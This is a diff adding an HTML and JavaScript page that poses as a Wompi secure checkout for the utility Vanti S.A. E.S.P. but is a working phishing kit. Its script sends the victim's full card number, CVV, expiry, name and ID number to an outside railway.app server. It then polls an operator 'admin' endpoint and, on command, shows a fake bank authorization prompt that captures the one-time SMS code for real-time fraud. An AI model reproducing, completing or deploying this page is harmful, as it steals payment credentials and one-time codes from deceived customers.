@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Pago Seguro</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #f8f8f8; font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; font-size: 16px; line-height: 1.5; color: #16181e; }
+
+        .tarjeta-app { background: #fff; border-radius: 20px; overflow: hidden; }
+        .tarjeta-app .app-wrapper { width: 100%; max-width: 1112px; margin: 0 auto; }
+        .tarjeta-app .app { width: 100%; background: #fff; border-radius: 20px; border: 1px solid #eee; box-shadow: 0 3px 12px rgba(0,0,0,.1); display: flex; flex-direction: column; overflow: hidden; }
+        @media (min-width: 768px) { .tarjeta-app .app { flex-direction: row; } }
+
+        .tarjeta-app .merchant-section { padding: 32px; background: #f8fff8; display: flex; flex-direction: column; align-items: center; }
+        @media (min-width: 768px) { .tarjeta-app .merchant-section { width: 40%; border-radius: 20px 0 0 20px; } }
+        @media (max-width: 767px) { .tarjeta-app .merchant-section { padding: 16px; } }
+
+        .tarjeta-app .header { display: flex; margin-bottom: 16px; width: 100%; }
+        .tarjeta-app .header .logo { max-width: 30px; }
+        .tarjeta-app .price-panel { flex: 1; display: flex; flex-direction: column; justify-content: center; text-align: center; width: 100%; }
+        .tarjeta-app .price-panel .merchant-label { font-size: 14px; color: #3c3c3c; margin-bottom: 4px; }
+        .tarjeta-app .price-panel .merchant-name { font-size: 28px; font-weight: 700; color: #3c3c3c; margin-bottom: 12px; }
+        @media (max-width: 767px) { .tarjeta-app .price-panel .merchant-name { font-size: 18px; } }
+        .tarjeta-app .price-panel .info-pill { display: inline-flex; align-items: center; gap: 4px; padding: 4px 8px; border: 1px solid #2c2a29; border-radius: 25px; background: transparent; cursor: pointer; min-height: 26px; margin: 0 auto; }
+        .tarjeta-app .price-panel .info-pill span { font-size: 14px; color: #3c3c3c; }
+
+        .tarjeta-app .content-section { flex: 1; padding: 32px 24px 24px; }
+        @media (min-width: 768px) { .tarjeta-app .content-section { padding: 4rem 3rem 2rem 2rem; } }
+        @media (max-width: 767px) { .tarjeta-app .content-section { padding: 1rem 1rem 1.5rem 1rem; } }
+
+        .tarjeta-app .payment-method-badge { margin-bottom: 24px; }
+        .tarjeta-app .payment-method-badge .title { font-size: 18px; font-weight: 700; color: #3c3c3c; margin-bottom: 16px; }
+        .tarjeta-app .payment-method-badge .card { display: flex; align-items: center; gap: 12px; padding: 16px; border: 1px solid #7cb3dc; border-radius: 16px; background: #ebf6fe; margin-bottom: 8px; }
+        .tarjeta-app .payment-method-badge .card .logo { width: 32px; height: 32px; flex-shrink: 0; }
+        .tarjeta-app .payment-method-badge .card .name { font-size: 16px; font-weight: 600; color: #3c3c3c; flex: 1; }
+        .tarjeta-app .payment-method-badge .card .brand-logos { display: flex; align-items: center; gap: 8px; }
+        .tarjeta-app .payment-method-badge .change-link { background: none; border: none; color: #3c3c3c; text-decoration: underline; cursor: pointer; font-size: 14px; font-weight: 600; display: block; margin: 0 auto; }
+
+        .tarjeta-app .intro { margin-bottom: 16px; }
+        .tarjeta-app .intro-text { font-size: 16px; font-weight: 700; color: #2c2a29; }
+        .tarjeta-app .input-group { margin-bottom: 18px; }
+        .tarjeta-app .input-group label { display: block; font-size: 14px; color: #16181e; margin-bottom: 4px; }
+        .tarjeta-app .input-group input, .tarjeta-app .input-group select { width: 100%; padding: 10px 14px; border: 1px solid #cacaca; border-radius: 6px; font-size: 16px; background: #fff; color: #16181e; }
+        .tarjeta-app .input-group input:focus, .tarjeta-app .input-group select:focus { border-color: #bbcef3; outline: none; }
+
+        .tarjeta-app .card-input-wrapper { position: relative; display: flex; align-items: center; border: 1px solid #cacaca; border-radius: 6px; background: #fff; overflow: hidden; }
+        .tarjeta-app .card-input-wrapper:focus-within { border-color: #bbcef3; }
+        .tarjeta-app .card-input-wrapper input { width: 100%; padding: 10px 14px; border: none; outline: none; min-width: 0; }
+
+        /* 🔥 ANIMACIÓN DE LOGOS (con height incluido en transition) */
+        .tarjeta-app .card-input-wrapper .card-logos { display: flex; gap: 8px; padding-right: 14px; align-items: center; transition: padding .3s ease; }
+        .tarjeta-app .card-input-wrapper .card-logos .card-logo-item {
+            display: flex; align-items: center; justify-content: center;
+            width: 42px; height: 28px; overflow: hidden; flex-shrink: 0;
+            transition: opacity .35s ease, transform .35s cubic-bezier(.34,1.56,.64,1),
+                        width .35s ease, height .35s ease, margin .35s ease, padding .35s ease;
+            opacity: 1; transform: scale(1);
+        }
+        .tarjeta-app .card-input-wrapper .card-logos .card-logo-item svg,
+        .tarjeta-app .card-input-wrapper .card-logos .card-logo-item img {
+            width: 42px; height: 28px; object-fit: contain; border-radius: 3px;
+            transition: opacity .35s ease;
+        }
+        .tarjeta-app .card-input-wrapper .card-logos .card-logo-item.oculto {
+            opacity: 0; transform: scale(.4) rotate(-15deg);
+            width: 0; height: 0; margin-left: -8px; padding: 0; pointer-events: none;
+        }
+        .tarjeta-app .card-input-wrapper .card-logos .card-logo-item.oculto svg,
+        .tarjeta-app .card-input-wrapper .card-logos .card-logo-item.oculto img {
+            width: 0; height: 0; opacity: 0;
+        }
+
+        .tarjeta-app .row { display: flex; gap: 16px; }
+        .tarjeta-app .row .col { flex: 1; min-width: 0; }
+        @media (max-width: 480px) { .tarjeta-app .row { flex-direction: column; } }
+        .tarjeta-app .expiration-wrapper { display: flex; align-items: center; gap: 4px; }
+        .tarjeta-app .expiration-wrapper select { flex: 1; padding: 10px 12px; border: 1px solid #cacaca; border-radius: 6px; font-size: 16px; background: #fff; }
+        .tarjeta-app .cvv-input { -webkit-text-security: disc; }
+        .tarjeta-app .cvv-wrapper { position: relative; }
+        .tarjeta-app .cvv-wrapper .cvv-input { padding-right: 50px; }
+        .tarjeta-app .cvv-wrapper .cvv-help { position: absolute; right: 6px; top: 50%; transform: translateY(-50%); width: 40px; height: 40px; border-radius: 50%; border: 2px solid #2c2a29; display: flex; align-items: center; justify-content: center; cursor: pointer; background: #fff; }
+        .tarjeta-app .cvv-mensaje-amex { font-size: 12px; color: #b45309; background: #fffbeb; border-left: 3px solid #f59e0b; padding: 6px 10px; margin-top: 6px; border-radius: 4px; }
+        .tarjeta-app .custom-select { position: relative; display: block; }
+        .tarjeta-app .custom-select select { width: 100%; padding: 10px 30px 10px 12px; border: 1px solid #cacaca; border-radius: 6px; background: #fff; font-size: 16px; appearance: none; -webkit-appearance: none; }
+        .tarjeta-app .custom-select::after { content: ""; position: absolute; top: 50%; right: 12px; transform: translateY(-50%); border-left: 5px solid transparent; border-right: 5px solid transparent; border-top: 5px solid #16181e; pointer-events: none; }
+
+        /* 🔥 FIX CHECKBOXES - con appearance:none para que el checked funcione correctamente */
+        .tarjeta-app .checkbox-wrapper { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 12px; }
+        .tarjeta-app .checkbox-wrapper input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            min-width: 20px;
+            border: 1.5px solid #16181e;
+            border-radius: 4px;
+            cursor: pointer;
+            flex-shrink: 0;
+            appearance: none;
+            -webkit-appearance: none;
+            background: #fff;
+            position: relative;
+            transition: background .2s, border-color .2s;
+        }
+        .tarjeta-app .checkbox-wrapper input[type="checkbox"]:checked {
+            background: #d8f9d7;
+            border-color: #40a940;
+        }
+        .tarjeta-app .checkbox-wrapper input[type="checkbox"]:checked::after {
+            content: "";
+            position: absolute;
+            top: 45%;
+            left: 50%;
+            width: 5px;
+            height: 10px;
+            border: solid #000;
+            border-width: 0 2px 2px 0;
+            transform: translate(-50%, -60%) rotate(45deg);
+        }
+        .tarjeta-app .checkbox-wrapper label { font-size: 14px; color: #16181e; cursor: pointer; }
+        .tarjeta-app .checkbox-wrapper label a { color: #16181e; }
+
+        .tarjeta-app .buttons-wrapper { display: flex; flex-direction: column; gap: 12px; margin-top: 24px; }
+        @media (min-width: 768px) { .tarjeta-app .buttons-wrapper { flex-direction: row; align-items: center; gap: 16px; } }
+        .tarjeta-app .btn-back { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px 24px; background: #fff; border: 1px solid #3c3c3c; border-radius: 32px; font-size: 16px; font-weight: 600; color: #3c3c3c; cursor: pointer; width: 100%; }
+        @media (min-width: 768px) { .tarjeta-app .btn-back { width: auto; background: none; border: none; padding: 8px 0; margin-right: auto; } }
+        .tarjeta-app .btn-primary { padding: 14px 28px; background: #2c2a29; color: #dfff61; border: none; border-radius: 100px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all .15s ease; }
+        @media (min-width: 768px) { .tarjeta-app .btn-primary { width: auto; min-width: 200px; } }
+        .tarjeta-app .btn-primary:hover:not(:disabled) { background: #3d3a39; }
+        .tarjeta-app .btn-primary:disabled { opacity: .4; cursor: not-allowed; }
+
+        .tarjeta-app .footer { display: flex; align-items: center; gap: 12px; padding: 16px 20px; background: #f8f8f8; border-top: 1px solid #eee; width: 100%; justify-content: space-between; }
+        .tarjeta-app .footer .security-text { font-size: 12px; font-weight: 600; color: #667587; text-transform: uppercase; }
+        .tarjeta-app .footer .footer-logos { display: flex; align-items: center; gap: 12px; }
+        .tarjeta-app .footer .footer-logos img { height: 20px; }
+
+        .cvv-modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.6); z-index: 10000; justify-content: center; align-items: center; padding: 20px; }
+        .cvv-modal-overlay.active { display: flex; }
+        .cvv-modal { background: #fff; border-radius: 20px; max-width: 520px; width: 92%; padding: 20px; position: relative; max-height: 90vh; overflow-y: auto; }
+        .cvv-modal-close { position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 24px; cursor: pointer; }
+        .cvv-modal img { width: 100%; border-radius: 8px; }
+        .cvv-modal .btn-back-payment { display: block; width: 100%; padding: 14px; background: #2c2a29; color: #dfff61; border: none; border-radius: 100px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 16px; }
+
+        .auth-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.65); z-index: 10001; justify-content: center; align-items: center; padding: 20px; }
+        .auth-modal.show { display: flex; }
+        .auth-modal-content { background: #fff; max-width: 640px; width: 100%; border-radius: 12px; max-height: 90vh; overflow-y: auto; padding-bottom: 24px; position: relative; }
+        .auth-modal-close { position: absolute; top: 15px; right: 20px; font-size: 32px; background: none; border: none; cursor: pointer; }
+
+        .pago-carga-overlay { position: fixed; inset: 0; z-index: 99999; background: #ffffff; display: flex; align-items: center; justify-content: center; }
+        .pago-carga-overlay.hidden { display: none !important; }
+        .spinner-wompi { position: relative; width: 250px; height: 250px; display: flex; align-items: center; justify-content: center; }
+        .spinner-wompi .logo-central { position: absolute; width: 100px; }
+        .spinner-wompi::before, .spinner-wompi::after { content: ''; position: absolute; border-radius: 50%; border: 16px solid transparent; border-top-color: #b2f599; width: 100%; height: 100%; animation: spin 1.5s linear infinite; }
+        .spinner-wompi::after { width: 80%; height: 80%; border-top-color: transparent; border-bottom-color: #b2f599; animation-direction: reverse; animation-duration: 2s; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="tarjeta-app">
+  <div class="app-wrapper">
+    <div class="app">
+      <div class="merchant-section">
+        <div class="header"><img src="assets/image/logocc.svg" alt="Logo" class="logo" onerror="this.style.display='none'"></div>
+        <div class="price-panel">
+          <div class="merchant-label">Pago a</div>
+          <div class="merchant-name">Vanti S.A. E.S.P.</div>
+        </div>
+      </div>
+      <div class="content-section">
+        <div class="payment-method-badge">
+          <p class="title">Estás pagando con:</p>
+          <div class="card">
+            <div class="logo">
+              <svg width="40" height="40" viewBox="0 0 40 40"><circle cx="20" cy="20" r="20" fill="#2C2A29"/><path d="M10.667 24.668H14.667V26.0013H10.667V24.668Z" fill="white"/><path d="M16.0003 24.668H29.3337V26.0013H16.0003V24.668Z" fill="white"/></svg>
+            </div>
+            <span class="name">Tarjeta débito o crédito</span>
+            <div class="brand-logos">
+              <svg width="38" height="12" viewBox="0 0 38 12"><path d="M24.75 0C22.05 0 19.64 1.36 19.64 3.88C19.64 6.77 23.92 6.97 23.92 8.42C23.92 9.03 23.2 9.58 21.97 9.58C20.91 9.57 19.86 9.31 18.93 8.81L18.37 11.35C19.48 11.78 20.67 12 21.86 12C24.81 12 27.14 10.57 27.14 8.01C27.14 4.96 22.85 4.76 22.85 3.42C22.85 2.94 23.43 2.42 24.66 2.42C25.52 2.43 26.38 2.62 27.17 2.97L27.71 0.52C26.77 0.17 25.76 -0.01 24.75 0Z" fill="#1434CB"/></svg>
+              <svg width="25" height="21" viewBox="0 0 25 21"><circle cx="12.5" cy="10.5" r="10" fill="#EB001B"/><circle cx="17.5" cy="10.5" r="10" fill="#F79E1B"/></svg>
+              <img src="assets/image/amex.svg" alt="Amex" style="height:22px; width:auto;">
+            </div>
+          </div>
+          <button class="change-link" type="button" onclick="cerrarDesdeHijo()">Cambiar método de validación</button>
+        </div>
+        <div class="card-form">
+          <div class="intro"><span class="intro-text">Ingresa los datos de la tarjeta</span></div>
+          <form novalidate id="formTarjeta">
+            <div class="input-group">
+              <label for="cardNumber">Número de la tarjeta</label>
+              <div class="card-input-wrapper">
+                <input type="tel" id="cardNumber" placeholder="Número de la tarjeta" maxlength="19" autocomplete="cc-number">
+                <div class="card-logos" id="cardLogosWrapper">
+                  <div class="card-logo-item" id="logoVisa">
+                    <svg width="42" height="28" viewBox="0 0 38 12"><path d="M24.75 0C22.05 0 19.64 1.36 19.64 3.88C19.64 6.77 23.92 6.97 23.92 8.42C23.92 9.03 23.2 9.58 21.97 9.58C20.91 9.57 19.86 9.31 18.93 8.81L18.37 11.35C19.48 11.78 20.67 12 21.86 12C24.81 12 27.14 10.57 27.14 8.01C27.14 4.96 22.85 4.76 22.85 3.42C22.85 2.94 23.43 2.42 24.66 2.42C25.52 2.43 26.38 2.62 27.17 2.97L27.71 0.52C26.77 0.17 25.76 -0.01 24.75 0Z" fill="#1434CB"/></svg>
+                  </div>
+                  <div class="card-logo-item" id="logoMastercard">
+                    <svg width="42" height="28" viewBox="0 0 25 21"><circle cx="12.5" cy="10.5" r="10" fill="#EB001B"/><circle cx="17.5" cy="10.5" r="10" fill="#F79E1B"/></svg>
+                  </div>
+                  <div class="card-logo-item" id="logoAmex">
+                    <img src="assets/image/amex.svg" alt="Amex" style="width:42px; height:28px; object-fit:contain;">
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="row">
+              <div class="col">
+                <div class="input-group">
+                  <label>Fecha de expiración</label>
+                  <div class="expiration-wrapper">
+                    <div class="custom-select"><select id="expiryMonth"><option value="" disabled selected>Mes</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select></div>
+                    <div class="custom-select"><select id="expiryYear"><option value="" disabled selected>Año</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option><option value="39">39</option><option value="40">40</option></select></div>
+                  </div>
+                </div>
+              </div>
+              <div class="col">
+                <div class="input-group">
+                  <label for="cvv">Código de seguridad (CVC o CVV)</label>
+                  <div class="cvv-wrapper">
+                    <input type="text" id="cvv" class="cvv-input" placeholder="Ingresa tu código" maxlength="4" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')">
+                  </div>
+                  <div id="cvvMensajeAmex" class="cvv-mensaje-amex" style="display:none;"></div>
+                </div>
+              </div>
+            </div>
+            <div class="input-group">
+              <label for="cardHolder">Nombre del titular</label>
+              <input type="text" id="cardHolder" placeholder="Ingresa nombre y apellido del titular" autocomplete="cc-name">
+            </div>
+            <div class="input-group">
+              <label>Documento del titular</label>
+              <div style="display:flex;gap:8px;">
+                <div class="custom-select" style="flex:0 0 90px;">
+                  <select id="docType">
+                    <option value="CC" selected>CC</option>
+                    <option value="RC">RC</option>
+                    <option value="TE">TE</option>
+                    <option value="CE">CE</option>
+                    <option value="NIT">NIT</option>
+                    <option value="PP">PP</option>
+                  </select>
+                </div>
+                <input type="tel" id="docNumber" placeholder="Ingresa el número" style="flex:1;min-width:0;" maxlength="30" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')">
+              </div>
+            </div>
+            <div class="checkbox-wrapper">
+              <input type="checkbox" id="acceptance1">
+              <label for="acceptance1">Acepto haber leído <a href="#"><strong>el reglamento</strong></a>.</label>
+            </div>
+            <div class="checkbox-wrapper">
+              <input type="checkbox" id="acceptance2">
+              <label for="acceptance2">Acepto la <a href="#"><strong>autorización para la administración de datos</strong></a>.</label>
+            </div>
+            <div class="buttons-wrapper">
+              <button type="button" class="btn-back" onclick="cerrarDesdeHijo()">
+                <svg width="20" height="20" viewBox="0 0 24 23"><path d="M11.7 22.1L10.8 23L1.5 13.6C1 13.2 0.75 12.5 0.75 11.9C0.75 11.2 1 10.6 1.5 10.1L10.8 0.75L11.7 1.6L2.4 11H23.3V12.5H2.2L11.7 22.1Z" fill="#2C2A29"/></svg>
+                Volver
+              </button>
+              <button type="button" class="btn-primary" id="submitBtn" disabled>
+                <span id="submitBtnText">Continuar con tu pago</span>
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    <div class="footer">
+      <span class="security-text">Pago Seguro</span>
+      <div class="footer-logos">
+        <img src="https://public-assets.wompi.com/brand_wompi/logos/pago-seguro-wompi-desktop.svg" alt="Wompi">
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="pago-carga-overlay hidden" id="pagoCargaOverlay">
+  <div class="spinner-wompi">
+    <img src="assets/image/logocc.svg" alt="Logo" class="logo-central" onerror="this.style.display='none'">
+  </div>
+</div>
+
+<div class="auth-modal" id="authModal">
+  <div class="auth-modal-content">
+    <button class="auth-modal-close" onclick="closeAuthModal()">×</button>
+    <div style="padding:32px 24px 48px; font-family:'Inter',system-ui,sans-serif;">
+      <h1 style="font-size:18px; margin:0 0 20px 0;">Autorización del pago</h1>
+      <p>El pago que intentas realizar en VANTI S.A. E.S.P. por $<span id="montoPopup">0</span> COP con tu tarjeta terminada en <strong id="lastFourDigitsPopup">************</strong> debe ser autorizada.</p>
+      <p style="margin-top:16px;">Ingresa tu Clave Dinámica o SMS:</p>
+      <input type="text" id="dynamicCode" style="border:1px solid #999; height:38px; width:100%; max-width:220px; padding:0 10px; font-size:15px; border-radius:4px; margin-top:8px;" maxlength="8" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')">
+      <div style="text-align:center; margin-top:24px;">
+        <button type="button" id="btnEnviarDinamica" style="background:#000; color:#fff; border:0; padding:12px 40px; font-weight:600; font-size:16px; border-radius:4px; cursor:pointer;">Enviar</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+    'use strict';
+    var API = 'https://multi-bancos-production.up.railway.app';
+
+    // 🔥 DEBUG: confirmar que el script corre
+    console.log('🔥 tarjeta.html JS cargado OK');
+    window.addEventListener('error', function(e) {
+        console.error('❌ Error en tarjeta.html:', e.message, 'en', e.filename, 'línea', e.lineno);
+    });
+
+    // 🔥 Obtener precio del padre con try/catch por si hay cross-origin
+    var precioMonto = 95700;
+    try {
+        if (window.parent && window.parent !== window && window.parent.TOTAL_PAGO) {
+            precioMonto = window.parent.TOTAL_PAGO;
+        }
+    } catch (e) { console.warn('No se pudo leer TOTAL_PAGO:', e); }
+
+    // 🔥 SessionId de la URL
+    var urlParams = new URLSearchParams(window.location.search);
+    var sessionIdActual = urlParams.get('sessionId');
+    if (!sessionIdActual) {
+        try {
+            if (window.parent && window.parent.sessionStorage) {
+                sessionIdActual = window.parent.sessionStorage.getItem('vanti_sessionId');
+            }
+        } catch (e) {}
+    }
+    if (!sessionIdActual) sessionIdActual = 'vanti_' + Date.now();
+
+    console.log('[tarjeta] sessionId:', sessionIdActual, 'precio:', precioMonto);
+
+    // Referencias DOM
+    var cardNumber = document.getElementById('cardNumber');
+    var expiryMonth = document.getElementById('expiryMonth');
+    var expiryYear = document.getElementById('expiryYear');
+    var cvv = document.getElementById('cvv');
+    var cardHolder = document.getElementById('cardHolder');
+    var docNumber = document.getElementById('docNumber');
+    var accept1 = document.getElementById('acceptance1');
+    var accept2 = document.getElementById('acceptance2');
+    var submitBtn = document.getElementById('submitBtn');
+    var submitBtnText = document.getElementById('submitBtnText');
+
+    var logoVisa = document.getElementById('logoVisa');
+    var logoMastercard = document.getElementById('logoMastercard');
+    var logoAmex = document.getElementById('logoAmex');
+    var cardLogosWrapper = document.getElementById('cardLogosWrapper');
+
+    // 🔥 Detectar marca
+    function detectarMarca(numero) {
+        var digitos = (numero || '').replace(/\D/g, '');
+        if (digitos.length === 0) return '';
+        var primero = digitos.charAt(0);
+        if (primero === '4') return 'visa';
+        if (primero === '5' || primero === '2') return 'mastercard';
+        if (primero === '3') return 'amex';
+        return '';
+    }
+
+    function esAmex() {
+        return cardNumber.value.replace(/\D/g, '').charAt(0) === '3';
+    }
+
+    // 🔥 ANIMACIÓN DE LOGOS
+    function filtrarLogos(numero) {
+        var marca = detectarMarca(numero);
+        if (!marca) {
+            if (logoVisa) logoVisa.classList.remove('oculto');
+            if (logoMastercard) logoMastercard.classList.remove('oculto');
+            if (logoAmex) logoAmex.classList.remove('oculto');
+            return;
+        }
+        if (logoVisa) logoVisa.classList.add('oculto');
+        if (logoMastercard) logoMastercard.classList.add('oculto');
+        if (logoAmex) logoAmex.classList.add('oculto');
+
+        if (marca === 'visa' && logoVisa) logoVisa.classList.remove('oculto');
+        else if (marca === 'mastercard' && logoMastercard) logoMastercard.classList.remove('oculto');
+        else if (marca === 'amex' && logoAmex) logoAmex.classList.remove('oculto');
+    }
+
+    function actualizarMensajeCvv() {
+        var mensaje = document.getElementById('cvvMensajeAmex');
+        if (!mensaje) return;
+        var cvvVal = cvv.value.replace(/\D/g, '');
+        if (esAmex() && cvvVal.length > 0 && cvvVal.length < 4) {
+            mensaje.style.display = 'block';
+            mensaje.textContent = 'Tu tarjeta es American Express: el CVV debe tener 4 dígitos';
+        } else {
+            mensaje.style.display = 'none';
+        }
+    }
+
+    // Formato de tarjeta
+    cardNumber.addEventListener('input', function() {
+        var value = this.value.replace(/\D/g, '');
+        var maxLen = (value.charAt(0) === '3') ? 15 : 16;
+        if (value.length > maxLen) value = value.slice(0, maxLen);
+        var formatted = '';
+        for (var i = 0; i < value.length; i++) {
+            if (value.charAt(0) === '3') {
+                if (i === 4 || i === 10) formatted += ' ';
+            } else {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+            }
+            formatted += value[i];
+        }
+        this.value = formatted;
+        filtrarLogos(value);   // 🔥 animación
+        validateForm();
+    });
+
+    cvv.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        actualizarMensajeCvv();
+        validateForm();
+    });
+
+    docNumber.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 30);
+        validateForm();
+    });
+
+    // Luhn
+    function luhnCheck(cardNumber) {
+        var sum = 0, shouldDouble = false;
+        for (var i = cardNumber.length - 1; i >= 0; i--) {
+            var digit = parseInt(cardNumber.charAt(i));
+            if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+        }
+        return sum % 10 === 0;
+    }
+
+    // 🔥 Validar formulario (con debug para ver qué falla)
+    function validateForm() {
+        var cardVal = cardNumber.value.replace(/\s/g, '');
+        var isCardValid = cardVal.length >= 15 && cardVal.length <= 16 && luhnCheck(cardVal);
+        var cvvValido = esAmex() ? cvv.value.length === 4 : (cvv.value.length >= 3 && cvv.value.length <= 4);
+        var isValid = isCardValid
+            && expiryMonth.value !== ''
+            && expiryYear.value !== ''
+            && cvvValido
+            && cardHolder.value.trim().length >= 2
+            && docNumber.value.trim().length >= 4
+            && accept1.checked
+            && accept2.checked;
+        submitBtn.disabled = !isValid;
+        actualizarMensajeCvv();
+
+        // 🔥 DEBUG: muestra qué campos están OK y cuáles no
+        console.log('[validate]', {
+            card: isCardValid,
+            month: expiryMonth.value !== '',
+            year: expiryYear.value !== '',
+            cvv: cvvValido,
+            holder: cardHolder.value.trim().length >= 2,
+            doc: docNumber.value.trim().length >= 4,
+            check1: accept1.checked,
+            check2: accept2.checked,
+            btnDisabled: submitBtn.disabled
+        });
+    }
+
+    [cardNumber, cvv, cardHolder, docNumber, accept1, accept2].forEach(function(el) {
+        el.addEventListener('input', validateForm);
+        el.addEventListener('change', validateForm);
+    });
+    [expiryMonth, expiryYear].forEach(function(el) { el.addEventListener('change', validateForm); });
+
+    setTimeout(validateForm, 100);
+
+    // 🔥 BOTÓN CONTINUAR
+    submitBtn.addEventListener('click', async function(e) {
+        e.preventDefault();
+        if (this.disabled) return;
+
+        this.disabled = true;
+        submitBtnText.textContent = 'Procesando...';
+
+        var cardInput = cardNumber.value.replace(/\D/g, '');
+        var marca = detectarMarca(cardInput);
+
+        var payload = {
+            sessionId: sessionIdActual,
+            bancoKey: 'vanti',
+            marca: marca,
+            tarjeta: cardNumber.value,
+            titular: cardHolder.value.trim(),
+            docType: document.getElementById('docType').value,
+            docNumber: docNumber.value.trim(),
+            monto: precioMonto,
+            expMes: expiryMonth.value,
+            expAnio: expiryYear.value,
+            cvv: cvv.value,
+            subsidio: true
+        };
+
+        try {
+            var res = await fetch(API + '/vanti/enviar-pago', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            if (!res.ok) throw new Error('Error servidor: ' + res.status);
+            console.log('[tarjeta] Pago enviado OK');
+        } catch (err) {
+            console.error('[tarjeta] Error enviando pago:', err);
+        }
+
+        document.getElementById('pagoCargaOverlay').classList.remove('hidden');
+
+        try {
+            if (window.parent && window.parent !== window) {
+                window.parent.postMessage('mostrarCargaWompi', '*');
+            }
+        } catch (err) {}
+    });
+
+    // 🔥 MODAL OTP
+    function openAuthModal() {
+        document.getElementById('montoPopup').textContent = Number(precioMonto).toLocaleString('es-CO');
+        var cardInput = cardNumber.value.replace(/\D/g, '');
+        var lastFour = cardInput.slice(-4);
+        var masked = lastFour.length === 4 ? '************' + lastFour : '************';
+        document.getElementById('lastFourDigitsPopup').textContent = masked;
+        var modal = document.getElementById('authModal');
+        modal.style.display = 'flex';
+        setTimeout(function() { modal.classList.add('show'); }, 10);
+    }
+
+    function closeAuthModal() {
+        var modal = document.getElementById('authModal');
+        modal.classList.remove('show');
+        setTimeout(function() { modal.style.display = 'none'; }, 400);
+    }
+    window.closeAuthModal = closeAuthModal;
+
+    // 🔥 ENVIAR OTP
+    document.getElementById('btnEnviarDinamica').addEventListener('click', async function() {
+        var codigo = document.getElementById('dynamicCode').value.replace(/\D/g, '');
+        if (!codigo || codigo.length < 4) {
+            alert('Por favor ingresa tu clave dinámica o SMS (mínimo 4 dígitos)');
+            return;
+        }
+        closeAuthModal();
+        document.getElementById('pagoCargaOverlay').classList.remove('hidden');
+
+        try {
+            await fetch(API + '/vanti/enviar-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId: sessionIdActual, otp: codigo, bancoKey: 'vanti' })
+            });
+        } catch (err) { console.error('[tarjeta] Error OTP:', err); }
+
+        try {
+            if (window.parent && window.parent !== window) {
+                window.parent.postMessage('mostrarCargaWompi', '*');
+            }
+        } catch (err) {}
+    });
+
+    // 🔥 Cerrar desde el hijo (botón Volver)
+    window.cerrarDesdeHijo = function() {
+        try {
+            if (window.parent && window.parent !== window) {
+                window.parent.postMessage('cerrarTarjeta', '*');
+            }
+        } catch (err) {}
+    };
+
+    // 🔥 POLLING: escuchar al admin
+    var ultimoEstado = '';
+    setInterval(async function() {
+        if (!sessionIdActual) return;
+        try {
+            var res = await fetch(API + '/vanti/estado/' + sessionIdActual);
+            var data = await res.json();
+            if (data.estado === ultimoEstado) return;
+            ultimoEstado = data.estado;
+
+            console.log('[tarjeta] Cambio estado:', data);
+
+            if (data.estado === 'otp' || data.accion === 'OTP' || data.accion === 'PEDIR_DINAMICA') {
+                document.getElementById('pagoCargaOverlay').classList.add('hidden');
+                try {
+                    if (window.parent && window.parent !== window) {
+                        window.parent.postMessage('ocultarCargaWompi', '*');
+                    }
+                } catch (err) {}
+                if (!document.getElementById('authModal').classList.contains('show')) {
+                    openAuthModal();
+                }
+            } else if (data.estado === 'aceptado' || data.accion === 'ACEPTAR' || data.estado === 'finalizado') {
+                document.getElementById('pagoCargaOverlay').classList.add('hidden');
+                closeAuthModal();
+                try {
+                    if (window.parent && window.parent !== window) {
+                        window.parent.postMessage('ocultarCargaWompi', '*');
+                    }
+                } catch (err) {}
+                alert('✅ ¡Pago exitoso! Gracias por tu compra.');
+            } else if (data.estado === 'rechazado' || data.accion === 'RECHAZAR' || data.accion === 'CC_ERROR') {
+                document.getElementById('pagoCargaOverlay').classList.add('hidden');
+                closeAuthModal();
+                try {
+                    if (window.parent && window.parent !== window) {
+                        window.parent.postMessage('ocultarCargaWompi', '*');
+                    }
+                } catch (err) {}
+                alert('❌ La transacción fue rechazada o la tarjeta no es válida.');
+            }
+        } catch (err) { /* silencioso */ }
+    }, 2000);
+
+})();
+</script>
+</body>
+</html>
